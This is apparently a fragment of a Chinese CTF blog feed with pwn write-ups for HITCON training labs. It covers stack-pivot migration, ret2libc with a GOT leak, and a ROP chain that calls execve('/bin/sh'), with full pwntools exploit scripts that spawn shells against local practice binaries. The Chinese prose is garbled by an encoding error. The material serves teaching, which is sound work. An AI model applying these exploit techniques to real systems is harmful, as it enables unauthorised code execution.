process<span class="token punctuation">(</span><span class="token string">'./migration'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./migration"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>system_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"system_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system_libc<span class="token punctuation">)</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"read_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>puts_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_libc<span class="token punctuation">)</span>binsh_libc<span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"binsh_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>binsh_libc<span class="token punctuation">)</span>leave_ret <span class="token operator">=</span> <span class="token number">0x08048418</span>p3ret <span class="token operator">=</span> <span class="token number">0x08048569</span> <span class="token comment" spellcheck="true">#pop esi ; pop edi ; pop ebp ; ret</span>p1ret <span class="token operator">=</span> <span class="token number">0x0804836d</span> <span class="token comment" spellcheck="true">#pop_ebp_ret</span>buf1 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x500</span>buf2 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x400</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token comment" spellcheck="true"># buf1 ‰∏∫ebpÔºåeip ==> read_plt ==> leave_ret‰∏∫ËøîÂõûÂú∞ÂùÄ ==>read(0,buf1,0x100)</span>payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leave;ret ==> mov ebp,esp; pop ebp; ret;</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" :\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#ÈÄöËøá‰πãÂâçÁöÑleave_retÔºåÂ∞Übuf2‰Ωú‰∏∫ebpÔºåÂæóÂà∞puts_addr,ÈÄöËøálibcÊ≥ÑÈú≤ÂæóÂà∞binshÔºåsystem_addr</span>payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>p1ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"puts_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>offset <span class="token operator">=</span> puts_addr <span class="token operator">-</span> puts_libcsystem_addr <span class="token operator">=</span> system_libc <span class="token operator">+</span> offsetbinsh <span class="token operator">=</span> binsh_libc <span class="token operator">+</span>offset<span class="token triple-quoted-string string">'''payload =p32(buf1)+p32(read_plt)+p32(p3ret)+p32(0)+p32(buf1)+p32(0x100)+p32(system_addr)+p32(0xdeadbeef)+p32(buf1)p.send(payload)sleep(0.1)#p.send("/bin/sh\0")p.interactive()'''</span><span class="token comment" spellcheck="true">#ÊáµÈÄºÊ†à</span>payload <span class="token operator">=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"bbbb"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>expËøêË°åÊïàÊûúÔºö<img src="https://i.loli.net/2018/10/25/5bd17a3f8c896.png" alt=""></p><blockquote><p>ËøôÈ¢ò‰º™ÈÄ†ÂÅáÊ†àÂ∏ßÔºå‰ªéËÄåÊûÑÈÄ†ropchainÔºåÁÆÄÁõ¥Â∞±ÊòØ‰∏ÄÂú∫Ê∂àÂåñÁõõÂÆ¥ÔºåÊàëÈúÄË¶ÅÂ•ΩÂ•ΩÊ∂àÂåñ‰∏Ä‰∏ãlab6„ÄÇ</p><p>‰ªäÂ§©ËøòÁúã‰∫Ü‰∏Ä‰∏ãÂÆâÊÅí‰∏ÄÂë®Âπ¥ÁâπÂà´ËµõÁöÑ‰∏ÄÈÅìpwnÈ¢ò‚ÄìoverÔºåÂÅö‰∏ÄÂçäÂèëÁé∞Âè™ËÉΩÊéßÂà∂ebpÂíåeipÔºüÔºüÔºüÊ≤°ÊÉ≥Âà∞ÊòØÂÆâÊÅíÊùØÂÖ≠ÊúàËµõÁöÑ‰∏ÄÈÅìÂéüÈ¢òÔºåÂú®ctf-wikiÁöÑËä±ÂºèÊ†àÊ∫¢Âá∫ÊäÄÂ∑ßÈáåÈù¢ÊúâÔºåÂπ∂‰∏îÂíålab6‰∏ÄÊ†∑‰πüÊòØÈÄöËøáÊéßÂà∂ebpÂíåeipÊù•ÂÅöÔºå‰ΩÜÊòØÈÇ£È¢òÂπ∂Ê≤°ÊúâÂ§öÂá∫Êù•ÁöÑÊ∫¢Âá∫Â≠óËäÇ„ÄÇ</p><p>ÊÄªÁöÑÊù•ËØ¥Ôºå‰∏§ÁßçÈÉΩÂèØ‰ª•Áß∞‰Ωú‰º™ÈÄ†ÂÅáÊ†àÂ∏ßÔºö<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/others/#_6" target="_blank" rel="noopener">CTF-WIKI-Ëä±ÂºèÊ†àÊ∫¢Âá∫</a>„ÄÇ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> ‰∫åËøõÂà∂ÂÆâÂÖ® </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10Êúà24-Hitcon(‰∫å)</title>
      <link href="/2018/10/24/Pwn-10%E6%9C%8824-Hitcon-%E4%BA%8C/"/>
      <url>/2018/10/24/Pwn-10%E6%9C%8824-Hitcon-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Pwn-10Êúà24-hitcon-‰∫å"><a href="#Pwn-10Êúà24-hitcon-‰∫å" class="headerlink" title="Pwn-10Êúà24-hitcon(‰∫å)"></a>Pwn-10Êúà24-hitcon(‰∫å)</h1><blockquote><p>ÁªßÁª≠hitconÁöÑËß£È¢ò‰πãË∑Ø„ÄÇ</p></blockquote><h2 id="lab4-ret2lib"><a href="#lab4-ret2lib" class="headerlink" title="lab4 - ret2lib"></a>lab4 - ret2lib</h2><blockquote><p>ÊãøÂà∞È¢òÁõÆÁúãÈ¢òÁõÆÂêçÔºåÂíålab3ÁöÑret2scÂ∑Æ‰∏çÂ§öÔºåËøô‰∏™Â∫îËØ•ÊòØreturn to libcÔºå‰πüÊòØ‰∏ÄÁßçÊîªÂáªÊâãÊ≥ï„ÄÇÊ≥ÑÈú≤libcÂπ∂‰∏îleakÂá∫libcÂü∫Âú∞ÂùÄÔºå‰ªéËÄågetshellÔºüüòÑ</p></blockquote><h3 id="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ"><a href="#Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ" class="headerlink" title="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ"></a>Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ</h3><blockquote><p><code>checksec ret2lib</code>:</p><p><img src="https://i.loli.net/2018/10/24/5bcffda0c6f43.png" alt=""></p></blockquote><h3 id="ÈÄªËæëÂàÜÊûê"><a href="#ÈÄªËæëÂàÜÊûê" class="headerlink" title="ÈÄªËæëÂàÜÊûê"></a>ÈÄªËæëÂàÜÊûê</h3><blockquote><p>ÁÆÄÂçïË∑ë‰∏Ä‰∏ãÔºö</p><p><img src="https://i.loli.net/2018/10/24/5bd0000628c22.png" alt=""></p><p>Á®ãÂ∫èËÆ©Êàë‰ª¨ËæìÂÖ•‰∏Ä‰∏™Âú∞ÂùÄÔºå‰ª•Êï¥ÂûãÁöÑÂΩ¢ÂºèËæìÂÖ•ÔºåÁÑ∂ÂêéÂÆÉ‰ºöËøîÂõûËøô‰∏™Âú∞ÂùÄÂ≠òÊúâÁöÑÂÜÖÂÆπÁªôÊàë‰ª¨ÔºåÁÑ∂ÂêéËÆ©Êàë‰ª¨<code>leave some message</code>ÔºåÂπ∂‰∏îÊâìÂç∞Âá∫Êù•ÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáËøô‰∏™ÂäüËÉΩ‰ªéGOTË°®‰∏≠Â∞Ü‰∏Ä‰∫õÂáΩÊï∞ÁöÑÁúüÂÆûÂú∞ÂùÄÊâìÂç∞Âá∫Êù•ÔºåÁÑ∂ÂêéÈÄöËøálibcÊñá‰ª∂‰∏≠ÂáΩÊï∞ÁöÑÂÅèÁßªÈáèËÆ°ÁÆóÂü∫Âú∞ÂùÄÔºå‰æãÂ¶ÇÂ∞ÜÊüê‰∏Ä‰∏™ÂáΩÊï∞ÁöÑGOTÊù°ÁõÆÁöÑÂú∞ÂùÄ‰º†ÁªôwriteÂáΩÊï∞ÔºåÂ∞±ÂèØ‰ª•Ê≥ÑÊºèËøô‰∏™ÂáΩÊï∞Âú®ËøõÁ®ãÁ©∫Èó¥‰∏≠ÁöÑÁúüÂÆûÂú∞ÂùÄÔºå<strong>GOTË°®‰∏≠ÊâÄÂ≠òÁöÑputsÂáΩÊï∞ÁöÑÂú∞ÂùÄ‰æøÊòØÂú®ret2libËøõÁ®ã‰∏≠ÁöÑÂÆûÈôÖÂú∞ÂùÄ„ÄÇ</strong></p><p>IDAÈáåÈù¢ÁúãÁúãÔºö</p><p><img src="https://i.loli.net/2018/10/24/5bd003fbb31e4.png" alt=""></p><p>ÈÄöËøáÂëΩ‰ª§<code>readelf -V ret2lib</code>ÂèØ‰ª•Êü•Âà∞ÂÖ∂libcÂ∫ìÁâàÊú¨‰∏∫<code>libc.so.6</code>Ôºö</p><p><img src="https://i.loli.net/2018/10/24/5bd009e18b194.png" alt=""></p><p>ÈÄöËøápwntoolsÁöÑelfÊ®°ÂùóÊàë‰ª¨ÂèØ‰ª•ÈìæÊé•ËØ•libc.so.6Â∫ìÔºåÁÆÄÂçïÁúãÁúãÈáåÈù¢ÁöÑÂáΩÊï∞Âú∞ÂùÄÔºö</p><p><img src="https://i.loli.net/2018/10/24/5bd00c1190711.png" alt=""></p><p>ÂêåÊ†∑ÈíàÂØπËøôÈ¢òÂèØ‰ª•‰ΩøÁî®IDA <code>alt + t</code>Êù•Êü•ÊâæGOTË°®putsÂú∞ÂùÄÔºå‰πüÂèØÈÄöËøá‰∏äËø∞ELFÊ®°ÂùóÈìæÊé•ret2libÁ®ãÂ∫èÔºåÈÄöËøá<code>elf.got[&#39;puts&#39;]</code>Êù•Ëé∑ÂèñGOTË°®‰∏≠putsÊù°ÁõÆÂú∞ÂùÄ:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd00d4fb5348.png" class="lazyload"></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd00d70f16de.png" class="lazyload"></p><p>Â∞Ü134520860‰Ωú‰∏∫Êàë‰ª¨ÈúÄË¶ÅËé∑ÂæóÂÜÖÂÆπÁöÑÂú∞ÂùÄËæìÂÖ•Á®ãÂ∫èÔºö</p><pre class=" language-bash"><code class="language-bash">Do you know <span class="token keyword">return</span> to library ?<span class="token comment" spellcheck="true">###############################</span>What <span class="token keyword">do</span> you want to see <span class="token keyword">in</span> memory?Give me an address <span class="token punctuation">(</span>in dec<span class="token punctuation">)</span> :134520860                                           The content of the address <span class="token keyword">:</span> 0xf7639250</code></pre><p>ÁÑ∂ÂêéÊàë‰ª¨Â∞±ÂæóÂà∞‰∫ÜputsÂáΩÊï∞Êù°ÁõÆÂú®Â≠òÂú®GOTË°®‰∏≠ÁöÑÂÜÖÂÆπÔºåÂç≥<strong>Ê≠§Ê¨°</strong>Á®ãÂ∫èËøêË°åÊó∂putsÂáΩÊï∞ÁöÑÁúüÂÆûÂú∞ÂùÄ<code>0xf7639250</code>„ÄÇ</p><p>libcÂü∫Âú∞ÂùÄËÆ°ÁÆóÔºö<strong>libcbase_addr = puts_addr - libc_puts = 0xf7639250 - 0x67250 = 0xf75d2000</strong></p><p>ËøôÈáåÊàëÂè™ÊòØÁÆÄÂçïÁöÑÂ±ïÁ§∫‰∏Ä‰∏ãËÆ°ÁÆóÊñπÊ≥ïÔºåÂÆûÈôÖ‰∏äÂú®Á®ãÂ∫èËøêË°åËøáÁ®ã‰∏≠libcÁöÑ<strong>Âü∫Âú∞ÂùÄÊòØ‰ºöÂèëÁîüÂèòÂåñÁöÑ</strong>ÔºåÊâÄ‰ª•‰∏çËÉΩÊèêÂâçËÆ°ÁÆóÂ•ΩÂü∫Âú∞ÂùÄÔºåÂÜçÂÜôexpÔºåË¶ÅÂú®expÈáåÈù¢ËÆ°ÁÆóÂü∫Âú∞ÂùÄÔºåËøôÊ†∑Â∞±‰∏ç‰ºöÂá∫Èîô„ÄÇ</p><p>Êó¢ÁÑ∂Â∑≤ÁªèÂèØ‰ª•ËÆ°ÁÆóÂá∫systemÂáΩÊï∞ÁöÑÂú∞ÂùÄ‰∫ÜÔºåÈÇ£‰πàÊàë‰ª¨Â∞±ÈúÄË¶ÅÊâæ‰∏Ä‰∏™shÔºåÂèØ‰ª•ÂØªÊâæbinaryÁ®ãÂ∫èÊú¨Ë∫´‰∏≠ÁöÑÂ≠óÁ¨¶‰∏≤Ôºå‰πüÂèØ‰ª•‰ΩøÁî®libc‰∏≠ÁöÑÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd012dbb4bb5.png" class="lazyload"></p><p>ÁÑ∂ÂêéÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáPrint_message()ÂáΩÊï∞Ê∫¢Âá∫ÔºåË¶ÜÁõñEIPÁöÑÂÄº‰ΩøÂÖ∂Ë∑≥ËΩ¨ÊâßË°åsystemÂáΩÊï∞Ôºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd017ba13b3e.png" class="lazyload"></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd018a67369c.png" class="lazyload"></p><p>ÂèØ‰ª•ÁúãÂà∞paddingÈïøÂ∫¶‰∏∫60ÔºåÊé•‰∏ãÊù•ÂÜôexpÂç≥ÂèØ.</p></blockquote><h3 id="ÊûÑÈÄ†exp"><a href="#ÊûÑÈÄ†exp" class="headerlink" title="ÊûÑÈÄ†exp"></a>ÊûÑÈÄ†exp</h3><blockquote><p>libcbase_addr = puts_addr - libc_puts</p><p>system_addr = libcbase_addr + libc.symbols[‚Äòsystem‚Äô]</p><p>return_addr = ‚Äòanything‚Äô</p><p>exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2lib"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ret2lib"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>libc_puts <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" : "</span><span class="token punctuation">)</span>libcbase_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc_putsreturn_addr <span class="token operator">=</span> <span class="token number">0x0804857D</span> <span class="token comment" spellcheck="true">#mainÂáΩÊï∞Âú∞ÂùÄ</span>success<span class="token punctuation">(</span><span class="token string">"libcbase_addr -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcbase_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libcbase_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">,</span> return_addr<span class="token punctuation">,</span> next<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh\x00ÊòØÂõ†‰∏∫ÂèØËÉΩÂåπÈÖçÂà∞ÂÖ∂‰ªñÂ≠óÁ¨¶‰∏≤Ôºå‰ªéËÄåÂä†‰∏™Êà™Êñ≠</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>ËøêË°åÊïàÊûúÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd01b3e9b344.png" class="lazyload"></p><h2 id="lab5-simplerop"><a href="#lab5-simplerop" class="headerlink" title="lab5-simplerop"></a>lab5-simplerop</h2><blockquote><p>simplerop ==&gt; easyrop ==&gt; babyrop?ÁªèÂéÜÁªùÊúõÁöÑËøáÁ®ãüò≠ÔºåÂèàÊòØ‰∏Ä‰∏™ÊûÑÈÄ†ropchainÁöÑÈ¢òÁõÆ„ÄÇ</p></blockquote><h3 id="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ-1"><a href="#Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ-1" class="headerlink" title="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ"></a>Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ</h3><blockquote><p><code>checksec ./simplerop</code></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd02cfbed61f.png" class="lazyload"></p><p>ÂºÄÂêØ‰∫ÜNXÔºåÊ†à‰∏çÂèØÊâßË°åÈò≤Êä§„ÄÇ</p></blockquote><h3 id="ÈÄªËæëÂàÜÊûê-1"><a href="#ÈÄªËæëÂàÜÊûê-1" class="headerlink" title="ÈÄªËæëÂàÜÊûê"></a>ÈÄªËæëÂàÜÊûê</h3><blockquote><p>ÈÄöËøáidaÁúãÁúãÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd037bdc39d0.png" class="lazyload"></p><p>ÈÄªËæëÂçÅÂàÜÁÆÄÂçïÔºåÂ∞±Ê∫¢Âá∫ÁÑ∂ÂêéÊûÑÈÄ†rop chainÔºåÈÄöËøágdbÂä®ÊÄÅË∞ÉËØïÂæóÂà∞Ê∫¢Âá∫ÁÇπÔºåpadding‰∏∫32Ôºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd0380835b4e.png" class="lazyload"></p><p>‰ΩÜÊòØËøô‰∏™È¢òÂûãË≤å‰ººÂè´Ôºö<code>ret2systemcall</code>ÔºåÊ≠§Á®ãÂ∫è‰∏≠Êó¢Êó†systemÂáΩÊï∞Ôºå‰πüÊó†/bin/shÂ≠óÁ¨¶‰∏≤ÔºåËøòÊòØÈùôÊÄÅÁºñËØëÔºåÊñ∞ÂßøÂäø ==&gt;rop chainÂêé int 0x80‰∏≠Êñ≠‰ªéËÄåÊâßË°åÁ≥ªÁªüË∞ÉÁî®==&gt; <code>execve(/bin/sh)</code>„ÄÇ</p><p><strong>ÂéüÁêÜÔºöÈÄöËøá‰∏ÄÁ≥ªÂàó pop|ret Á≠âgadgetÔºå‰ΩøÂæó eax = 0xbÔºàexecve 32 ‰Ωç‰∏ãÁöÑÁ≥ªÁªüË∞ÉÁî®Âè∑ÔºâÔºåebx -&gt; /bin/shÔºå ecx = edx = 0ÔºåÁÑ∂ÂêéÈÄöËøá <code>int 0x80</code> ÂÆûÁé∞Á≥ªÁªüË∞ÉÁî®ÔºåÊâßË°å execve(‚Äú/bin/sh‚Äù, 0, 0)</strong></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd03efc07ec3.png" class="lazyload"></p></blockquote><p>‰∏çÁü•ÈÅì‰∏∫Âï•ÊàëÁöÑROPgadgetÊü•‰∏çÂà∞Êàë‰ª¨ÊÉ≥Ë¶ÅÁöÑgadget„ÄÇ</p><h3 id="ÊûÑÈÄ†exp-1"><a href="#ÊûÑÈÄ†exp-1" class="headerlink" title="ÊûÑÈÄ†exp"></a>ÊûÑÈÄ†exp</h3><blockquote><p>exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>  p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./simplerop'</span><span class="token punctuation">)</span>  elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./simplerop'</span><span class="token punctuation">)</span>  pop_edx_ecx_ebx <span class="token operator">=</span> <span class="token number">0x0806eca0</span>  pop_eax <span class="token operator">=</span> <span class="token number">0x080b7e26</span>  pop_edx <span class="token operator">=</span> <span class="token number">0x0806ec7a</span>  int_80 <span class="token operator">=</span> <span class="token number">0x0806c8f5</span>  gadget <span class="token operator">=</span> <span class="token number">0x080707b9</span> <span class="token comment" spellcheck="true"># mov word ptr [edx],eax  </span>bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>  read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>  p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>  payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">32</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_edx<span class="token punctuation">)</span> <span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>  payload <span class="token operator">+=</span>  p32<span class="token punctuation">(</span>pop_edx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/sh\x00"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>  payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span>  payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>int_80<span class="token punctuation">)</span>  p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>ËøêË°åÊïàÊûúÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd043f350073.png" class="lazyload"></p><h2 id="Â∞èÁªì"><a href="#Â∞èÁªì" class="headerlink" title="Â∞èÁªì"></a>Â∞èÁªì</h2><p>ÂÜÖÂÆπÊ∂âÂèä: libcÊ≥ÑÈú≤Ôºåleak libcÂü∫Âú∞ÂùÄÔºåropchainÁ≥ªÁªüË∞ÉÁî®Ôºàint 0x80Ôºâ„ÄÇ</p><p>ropchainÁ≥ªÁªüË∞ÉÁî®ÂéüÁêÜÔºöÂú®Êó†systemÂáΩÊï∞Ôºå/bin/shÂèØÁî®ÁöÑÊÉÖÂÜµ‰∏ãÔºåÈÄöËøá‰∏ÄÁ≥ªÂàó pop|ret Á≠âgadgetÔºå‰ΩøÂæó eax = 0xbÔºàexecve 32 ‰Ωç‰∏ãÁöÑÁ≥ªÁªüË∞ÉÁî®Âè∑ÔºâÔºåebx -&gt; /bin/shÔºå ecx = edx = 0ÔºåÁÑ∂ÂêéÈÄöËøá <code>int 0x80</code> ÂÆûÁé∞Á≥ªÁªüË∞ÉÁî®ÔºåÊâßË°å execve(‚Äú/bin/sh‚Äù, 0, 0)„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> ‰∫åËøõÂà∂ÂÆâÂÖ® </tag>
            
        </tags>
      
    </entry>
    
    <entry>
